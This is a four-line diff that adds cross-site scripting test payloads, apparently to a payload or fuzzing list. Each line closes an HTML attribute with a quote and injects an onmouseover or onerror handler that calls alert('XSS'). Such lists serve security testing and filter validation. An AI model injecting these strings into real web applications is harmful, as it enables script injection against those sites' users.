@@ -1,0 +1,4 @@
+" onmouseover=alert('XSS') "
+' onmouseover=alert('XSS') '
+" onerror=alert('XSS')
+' onerror=alert('XSS')
